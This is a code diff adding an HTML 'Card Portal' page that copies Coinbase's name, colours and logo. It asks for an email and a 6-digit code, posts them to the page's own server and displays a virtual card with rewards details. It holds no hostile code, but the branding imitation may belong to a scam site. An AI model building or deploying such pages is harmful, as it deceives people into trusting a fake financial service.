@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Card Portal – Coinbase</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --blue: #0052FF; --green: #05B169;
+      --bg: #F7F8FA; --surface: #fff;
+      --border: #E8EAED; --text: #0A0B0D; --muted: #6B7280;
+    }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg); color: var(--text);
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+    }
+    body::before {
+      content: ''; position: fixed; inset: 0; z-index: 0;
+      background-image:
+        linear-gradient(rgba(0,82,255,.025) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,82,255,.025) 1px, transparent 1px);
+      background-size: 40px 40px; pointer-events: none;
+    }
+
+    /* NAVBAR */
+    nav {
+      position: sticky; top: 0; z-index: 100;
+      background: rgba(255,255,255,.97); backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+    }
+    .nav-inner {
+      max-width: 1120px; margin: 0 auto;
+      padding: 0 24px; height: 64px;
+      display: flex; align-items: center; gap: 32px;
+    }
+    .nav-logo { display: flex; align-items: center; text-decoration: none; }
+    .nav-links { display: flex; gap: 4px; flex: 1; }
+    .nav-link {
+      padding: 6px 14px; border-radius: 8px; font-size: 14px;
+      font-weight: 500; color: var(--muted); text-decoration: none; transition: all .15s;
+    }
+    .nav-link:hover { background: #F3F4F6; color: #111827; }
+    .nav-link.active { color: var(--blue); background: #EEF3FF; }
+
+    /* PAGE */
+    .page {
+      position: relative; z-index: 1;
+      display: flex; flex-direction: column; align-items: center;
+      padding: 60px 16px 80px;
+    }
+
+    /* CARD */
+    .card {
+      width: 100%; max-width: 460px;
+      background: var(--surface); border: 1px solid var(--border);
+      border-radius: 20px; padding: 36px 32px;
+      box-shadow: 0 4px 24px rgba(0,0,0,.06);
+    }
+
+    .portal-icon {
+      width: 56px; height: 56px; border-radius: 16px;
+      background: #EEF3FF; border: 1px solid #C7D7FF;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 26px; margin: 0 auto 20px;
+    }
+    h1 { font-size: 26px; font-weight: 800; text-align: center; margin-bottom: 8px; }
+    .sub { font-size: 14px; color: var(--muted); text-align: center; line-height: 1.6; margin-bottom: 28px; }
+
+    /* FORM */
+    .field { display: flex; flex-direction: column; gap: 5px; margin-bottom: 14px; }
+    .field label {
+      font-size: 11px; font-weight: 700; color: var(--muted);
+      text-transform: uppercase; letter-spacing: .06em;
+    }
+    .field input {
+      background: var(--surface); border: 1.5px solid var(--border);
+      border-radius: 10px; padding: 13px 14px;
+      font-size: 14px; color: var(--text); font-family: inherit; outline: none;
+      transition: border-color .15s, box-shadow .15s;
+    }
+    .field input:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(0,82,255,.1); }
+    .field input.code-input {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 22px; letter-spacing: .18em; text-align: center; font-weight: 700;
+    }
+
+    .btn {
+      width: 100%; background: var(--blue); color: #fff;
+      border: none; border-radius: 12px; padding: 15px;
+      font-size: 15px; font-weight: 700; cursor: pointer;
+      font-family: inherit; transition: all .2s;
+      box-shadow: 0 4px 16px rgba(0,82,255,.25); margin-top: 4px;
+    }
+    .btn:hover { background: #0041CC; transform: translateY(-1px); }
+    .btn:disabled { opacity: .6; cursor: not-allowed; transform: none; }
+
+    .error-msg {
+      display: none; color: #D23F31; font-size: 12px;
+      font-weight: 600; margin-bottom: 12px; text-align: center;
+    }
+
+    /* RESULT */
+    .result { display: none; flex-direction: column; align-items: center; }
+
+    .success-tick {
+      width: 56px; height: 56px; border-radius: 50%;
+      background: rgba(5,177,105,.12); border: 2px solid rgba(5,177,105,.3);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 24px; margin: 0 auto 20px;
+      animation: pop .4s cubic-bezier(.34,1.56,.64,1);
+    }
+    @keyframes pop { from{transform:scale(0)} to{transform:scale(1)} }
+
+    /* GENERATED CARD VISUAL */
+    .crypto-card {
+      width: 100%; max-width: 360px; height: 220px;
+      border-radius: 20px; position: relative; overflow: hidden;
+      box-shadow: 0 20px 50px rgba(0,0,0,.5);
+      margin-bottom: 24px;
+    }
+    .card-bg { position: absolute; inset: 0; background: linear-gradient(135deg, #0a0e2a 0%, #0f1535 40%, #1a0a2e 100%); }
+    .card-holo {
+      position: absolute; inset: 0;
+      background: linear-gradient(105deg, transparent 20%, rgba(0,82,255,.08) 30%, rgba(124,58,237,.1) 40%, rgba(6,182,212,.08) 50%, transparent 60%);
+      animation: holo 4s linear infinite;
+    }
+    @keyframes holo { 0%,100%{background-position:0} 50%{background-position:100%} }
+    .card-shimmer {
+      position: absolute; inset: 0;
+      background: linear-gradient(130deg, transparent 30%, rgba(255,255,255,.04) 50%, transparent 70%);
+      animation: shimmer 3s ease-in-out infinite;
+    }
+    @keyframes shimmer { 0%,100%{transform:translateX(-100%)} 50%{transform:translateX(100%)} }
+    .card-inner { position: absolute; inset: 0; padding: 22px 24px; display: flex; flex-direction: column; justify-content: space-between; }
+    .card-top { display: flex; justify-content: space-between; align-items: flex-start; }
+    .card-logo-row { display: flex; align-items: center; gap: 8px; }
+    .card-logo-row span { font-size: 13px; font-weight: 800; color: #fff; }
+    .card-badge { font-size: 9px; font-weight: 700; color: rgba(255,255,255,.6); background: rgba(255,255,255,.08); border: 1px solid rgba(255,255,255,.1); padding: 3px 8px; border-radius: 4px; }
+    .card-chip { width: 36px; height: 26px; background: linear-gradient(135deg,#d4af37,#f5d060,#b8860b); border-radius: 5px; margin: 14px 0 10px; }
+    .card-num { font-family: 'JetBrains Mono',monospace; font-size: 16px; letter-spacing: .15em; color: rgba(255,255,255,.9); }
+    .card-bottom { display: flex; align-items: flex-end; justify-content: space-between; }
+    .card-field label { display: block; font-size: 8px; color: rgba(255,255,255,.4); text-transform: uppercase; letter-spacing: .08em; margin-bottom: 3px; }
+    .card-field value { font-size: 12px; font-weight: 600; color: rgba(255,255,255,.85); }
+    .card-visa { font-size: 21px; font-weight: 800; font-style: italic; color: rgba(255,255,255,.9); }
+
+    /* DETAILS */
+    .details {
+      width: 100%; background: var(--surface);
+      border: 1px solid var(--border); border-radius: 14px; overflow: hidden; margin-bottom: 20px;
+    }
+    .d-row {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 12px 16px; border-bottom: 1px solid var(--border); font-size: 13px;
+    }
+    .d-row:last-child { border-bottom: none; }
+    .d-row span { color: var(--muted); }
+    .d-row strong { font-family: 'JetBrains Mono', monospace; font-size: 12px; }
+
+    .btn-ghost {
+      width: 100%; background: var(--surface); border: 1.5px solid var(--border);
+      color: var(--text); border-radius: 12px; padding: 13px;
+      font-size: 14px; font-weight: 600; cursor: pointer;
+      font-family: inherit; transition: all .2s;
+    }
+    .btn-ghost:hover { border-color: var(--blue); color: var(--blue); }
+
+    @media(max-width:480px){ .card { padding: 28px 20px; } }
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a href="index.html" class="nav-logo">
+      <svg width="116" height="24" viewBox="0 0 116 24" fill="none">
+        <circle cx="12" cy="12" r="12" fill="#0052FF"/>
+        <path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/>
+        <text x="28" y="17" font-family="Inter,sans-serif" font-size="16" font-weight="700" fill="#0052FF">coinbase</text>
+      </svg>
+    </a>
+    <div class="nav-links">
+      <a href="index.html" class="nav-link">Help Center</a>
+      <a href="card.html" class="nav-link">Coinbase Card</a>
+      <a href="portal.html" class="nav-link active">Card Portal</a>
+    </div>
+  </div>
+</nav>
+
+<div class="page">
+  <div class="card">
+
+    <!-- LOOKUP FORM -->
+    <div id="lookupView">
+      <div class="portal-icon">💳</div>
+      <h1>Access Your Card</h1>
+      <p class="sub">Enter the email you enrolled with and the 6-digit code sent to your inbox.</p>
+
+      <div class="field">
+        <label>Email address</label>
+        <input type="email" id="emailInput" placeholder="you@example.com" autocomplete="email" />
+      </div>
+      <div class="field">
+        <label>6-digit access code</label>
+        <input type="text" id="codeInput" class="code-input" placeholder="000000" maxlength="6" inputmode="numeric" autocomplete="one-time-code" />
+      </div>
+
+      <div class="error-msg" id="errMsg">⚠ No card found — check your email and code.</div>
+
+      <button class="btn" id="lookupBtn" onclick="lookupCard()">View My Card →</button>
+    </div>
+
+    <!-- CARD RESULT -->
+    <div class="result" id="resultView">
+      <div class="success-tick">✓</div>
+      <h1 style="margin-bottom:6px" id="rName">—</h1>
+      <p class="sub" id="rSub" style="margin-bottom:24px">Your card is active and ready to use.</p>
+
+      <div class="crypto-card">
+        <div class="card-bg"></div>
+        <div class="card-holo"></div>
+        <div class="card-shimmer"></div>
+        <div class="card-inner">
+          <div class="card-top">
+            <div class="card-logo-row">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#0052FF"/><path d="M12 5.5a6.5 6.5 0 100 13A6.5 6.5 0 0012 5.5zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/></svg>
+              <span>coinbase</span>
+            </div>
+            <span class="card-badge" id="rNetwork">VISA</span>
+          </div>
+          <div class="card-chip"></div>
+          <div class="card-num" id="rCardNum">•••• •••• •••• ••••</div>
+          <div class="card-bottom">
+            <div class="card-field">
+              <label>Card Holder</label>
+              <value id="rHolder">—</value>
+            </div>
+            <div class="card-field">
+              <label>Expires</label>
+              <value>04/28</value>
+            </div>
+            <div class="card-visa">VISA</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="details">
+        <div class="d-row"><span>Cardholder</span><strong id="dName" style="font-family:inherit;font-size:13px">—</strong></div>
+        <div class="d-row"><span>Card type</span><strong id="dType" style="font-family:inherit">—</strong></div>
+        <div class="d-row"><span>Card number</span><strong id="dNum">•••• •••• •••• ••••</strong></div>
+        <div class="d-row"><span>Expires</span><strong>04 / 28</strong></div>
+        <div class="d-row"><span>Rewards</span><strong style="color:#0052FF;font-family:inherit">4% back in XLM</strong></div>
+        <div class="d-row"><span>Enrolled</span><strong id="dDate" style="font-family:inherit;font-size:11px">—</strong></div>
+      </div>
+
+      <button class="btn-ghost" onclick="resetPortal()">← Look up a different card</button>
+    </div>
+
+  </div>
+</div>
+
+<script>
+async function lookupCard() {
+  const email = document.getElementById('emailInput').value.trim();
+  const code  = document.getElementById('codeInput').value.trim();
+  const err   = document.getElementById('errMsg');
+  const btn   = document.getElementById('lookupBtn');
+
+  err.style.display = 'none';
+
+  if (!email || code.length !== 6) {
+    err.textContent = '⚠ Enter your email and the 6-digit code.';
+    err.style.display = 'block';
+    return;
+  }
+
+  btn.disabled = true;
+  btn.textContent = 'Looking up…';
+
+  try {
+    const res  = await fetch('/api/verify-card', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email, code }),
+    });
+    const data = await res.json();
+
+    if (!res.ok || !data.success) {
+      err.textContent = `⚠ ${data.error || 'No card found — check your email and code.'}`;
+      err.style.display = 'block';
+      btn.disabled = false;
+      btn.textContent = 'View My Card →';
+      return;
+    }
+
+    showResult(data);
+  } catch (e) {
+    err.textContent = '⚠ Connection error. Is the server running?';
+    err.style.display = 'block';
+    btn.disabled = false;
+    btn.textContent = 'View My Card →';
+  }
+}
+
+function showResult(data) {
+  const name     = data.cardholder || '—';
+  const cardType = data.cardType   || 'virtual';
+  const cardNum  = data.cardNumber || '•••• •••• •••• ••••';
+  const enrolled = data.enrolledAt
+    ? new Date(data.enrolledAt).toLocaleDateString('en-US', { year:'numeric', month:'long', day:'numeric' })
+    : '—';
+
+  document.getElementById('rName').textContent    = name;
+  document.getElementById('rSub').textContent     = `Your ${cardType === 'physical' ? 'Physical' : 'Virtual'} Card is active.`;
+  document.getElementById('rHolder').textContent  = name;
+  document.getElementById('rCardNum').textContent = cardNum;
+  document.getElementById('dName').textContent    = name;
+  document.getElementById('dType').textContent    = cardType === 'physical' ? 'Physical Card' : 'Virtual Card';
+  document.getElementById('dNum').textContent     = cardNum;
+  document.getElementById('dDate').textContent    = enrolled;
+
+  document.getElementById('lookupView').style.display = 'none';
+  document.getElementById('resultView').style.display = 'flex';
+}
+
+function resetPortal() {
+  document.getElementById('lookupView').style.display = '';
+  document.getElementById('resultView').style.display = 'none';
+  document.getElementById('lookupBtn').disabled = false;
+  document.getElementById('lookupBtn').textContent = 'View My Card →';
+  document.getElementById('codeInput').value = '';
+}
+
+// Auto-format code input to digits only
+document.getElementById('codeInput').addEventListener('input', function() {
+  this.value = this.value.replace(/\D/g, '').slice(0, 6);
+});
+
+// Allow Enter key to submit
+document.addEventListener('keydown', e => {
+  if (e.key === 'Enter' && document.getElementById('lookupView').style.display !== 'none') {
+    lookupCard();
+  }
+});
+</script>
+</body>
+</html>
